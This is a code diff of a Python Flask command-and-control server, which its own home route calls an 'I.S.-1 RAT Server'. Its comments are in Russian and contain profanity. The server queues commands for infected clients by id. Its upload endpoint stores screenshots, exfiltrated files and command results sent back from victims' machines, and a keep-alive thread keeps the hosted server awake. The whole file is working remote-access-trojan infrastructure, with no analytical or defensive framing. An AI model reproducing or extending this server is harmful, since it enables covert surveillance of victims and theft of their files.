@@ -1,4 +1,3 @@
-# server.py - исправленная версия, ебаная
 from flask import Flask, request
 import base64
 import os
@@ -9,31 +8,24 @@ from datetime import datetime
 
 app = Flask(__name__)
 
+# Хранилище: { client_id: {"cmd": "screenshot", "pending": True} }
 pending_commands = {}
-results = {}
 
+# Автопинг (чтоб не засыпал)
 def auto_ping():
-    # Render НЕ ДАЕТ переменную RENDER_EXTERNAL_URL, поэтому хуйню пишем руками
-    render_url = "https://serv-ykcq.onrender.com"  # ЗАМЕНИ НА СВОЙ URL
-    print(f"[AUTOPING] Пингуем {render_url}")
-    
+    render_url = os.environ.get('RENDER_EXTERNAL_URL')
+    if not render_url:
+        render_url = "https://ТВОЙ-СЕРВЕР.onrender.com"  # ЗАМЕНИ!!!
     def ping():
         while True:
             try:
-                print(f"[AUTOPING] Пинг в {time.strftime('%Y-%m-%d %H:%M:%S')}...")
-                req = urllib.request.Request(
-                    render_url, 
-                    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
-                )
-                with urllib.request.urlopen(req, timeout=10) as response:
-                    print(f"[AUTOPING] Успешно: {response.status}")
+                req = urllib.request.Request(render_url, headers={'User-Agent': 'Mozilla/5.0'})
+                with urllib.request.urlopen(req, timeout=10) as resp:
+                    print(f"Ping OK: {resp.status}")
             except Exception as e:
-                print(f"[AUTOPING] Ошибка: {e}")
-            time.sleep(600)  # 10 минут
-    
-    ping_thread = threading.Thread(target=ping, daemon=True)
-    ping_thread.start()
-    print("[AUTOPING] Поток запущен")
+                print(f"Ping error: {e}")
+            time.sleep(600)
+    threading.Thread(target=ping, daemon=True).start()
 
 @app.route('/api', methods=['GET'])
 def get_command():
@@ -43,7 +35,7 @@ def get_command():
     if client_id in pending_commands and pending_commands[client_id].get("pending"):
         cmd = pending_commands[client_id]["cmd"]
         pending_commands[client_id]["pending"] = False
-        print(f"[CMD] Выдал команду {cmd} для {client_id}")
+        print(f"Выдаю команду {cmd} для {client_id}")
         return cmd
     return ""
 
@@ -51,39 +43,45 @@ def get_command():
 def upload():
     client_id = request.form.get('id')
     data = request.form.get('data')
-    if client_id and data:
+    if not client_id or not data:
+        return "fail"
+    # Сохраняем скриншот или результат
+    filename = f"log_{client_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+    if data.startswith("SCREEN:"):
+        img_data = data[7:]
         filename = f"screenshot_{client_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
         with open(filename, "wb") as f:
-            f.write(base64.b64decode(data))
-        print(f"[UPLOAD] Сохранил {filename}")
-        return "ok"
-    return "fail"
+            f.write(base64.b64decode(img_data))
+    elif data.startswith("FILE:"):
+        # Формат: FILE:путь:base64
+        parts = data.split(":", 2)
+        if len(parts) == 3:
+            file_path = parts[1]
+            file_data = parts[2]
+            filename = f"uploaded_{client_id}_{os.path.basename(file_path)}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
+            with open(filename, "wb") as f:
+                f.write(base64.b64decode(file_data))
+    else:
+        with open(filename, "w", encoding="utf-8") as f:
+            f.write(data)
+    print(f"Сохранён результат в {filename}")
+    return "ok"
 
 @app.route('/api/send', methods=['POST'])
 def send_command():
-    data = request.get_json()
-    client_id = data.get('id')
-    command = data.get('cmd')
-    if client_id and command:
-        pending_commands[client_id] = {"cmd": command, "pending": True}
-        print(f"[SEND] Поставил команду {command} для {client_id}")
+    client_id = request.form.get('id') or request.json.get('id')
+    cmd = request.form.get('cmd') or request.json.get('cmd')
+    if client_id and cmd:
+        pending_commands[client_id] = {"cmd": cmd, "pending": True}
+        print(f"Поставлена команда {cmd} для {client_id}")
         return "ok"
     return "fail"
 
 @app.route('/')
 def home():
-    return "I.S.-1 Control Server Running (with autoping)"
-
-# ЗАПУСКАЕМ АВТОПИНГ В ФОНОВОМ ПОТОКЕ (нахуй gunicorn)
-autoping_started = False
-
-@app.before_first_request
-def start_autoping():
-    global autoping_started
-    if not autoping_started:
-        autoping_started = True
-        auto_ping()
+    return "I.S.-1 RAT Server Running"
 
 if __name__ == '__main__':
-    auto_ping()  # для локального теста
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+    auto_ping()
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
